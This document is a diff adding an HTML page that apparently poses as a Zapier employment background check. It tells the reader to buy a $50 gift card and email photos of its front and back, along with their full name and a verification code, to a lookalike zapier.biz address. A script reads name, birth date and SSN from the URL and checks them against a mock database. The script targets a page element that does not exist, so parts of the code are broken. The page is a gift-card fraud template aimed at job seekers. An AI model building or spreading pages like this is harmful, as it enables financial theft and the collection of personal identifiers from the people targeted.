@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Background Check - Details</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .payment-container {
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        width: 500px;
+        text-align: center;
+      }
+      h2, h3, h4 {
+        color: #333;
+      }
+      .cards img {
+        width: 100px;
+        margin: 5px;
+        border-radius: 8px;
+        border: 1px solid #ccc;
+      }
+    </style>
+  </head>
+  <body>
+    
+    <div class="payment-container">
+      <h2>Payment Details</h2>
+      <h3>You have selected the following company below as your current employer.</h3>
+      <h2><img src="OCPhoto.765237743.846174.jpeg" alt="" class="zap" /> ZAPIER INC</h2>
+  
+      <h4>To complete and submit your background check, please purchase a $50 Visa Gift Card, Apple Gift Card, or American Express Card like any of the images below:</h4>
+      <div class="cards">
+        <img src="ImportedPhoto.764898962.082768.jpeg" alt="Card Example 1" />
+        <img src="ImportedPhoto.764898962.084217.jpeg" alt="Card Example 2" />
+        <img src="ImportedPhoto.764898962.085143.jpeg" alt="Card Example 3" />
+      </div>
+  
+      <h4>After you purchase a card, take a picture of it and send it to the email below:</h4>
+      <mailto:h3>hiringmanager@zapier.biz</h3>
+  
+      <h4>Include the following verification code:</h4>
+      <h1>CXZ457H</h1>
+  
+      <h4>Also include your full name and a clear image of the front and back of the $50 card:</h4>
+      <ul>
+        <li>Full Name</li>
+        <li>Verification Code</li>
+        <li>Front and back of $50 gift card</li>
+      </ul>
+    </div>
+    
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const name = params.get('name');
+    const dob = params.get('dob');
+    const ssn = params.get('ssn');
+  
+    const mockDatabase = [
+      {
+        name: "John Doe",
+        dob: "1990-01-01",
+        ssn: "1234",
+        record: "No criminal history. Clean background."
+      },
+      {
+        name: "Jane Smith",
+        dob: "1985-06-15",
+        ssn: "5678",
+        record: "Arrested in 2012 for petty theft. No recent incidents."
+      }
+    ];
+  
+    const result = mockDatabase.find(entry =>
+      entry.name === name && entry.dob === dob && entry.ssn === ssn
+    );
+  
+    const output = result
+      ? `Background Check Result for ${name}:\n${result.record}`
+      : `No background information found for ${name}.`;
+  
+    document.getElementById('userData').innerText = output;
+  </script>
+</body>
+</html>
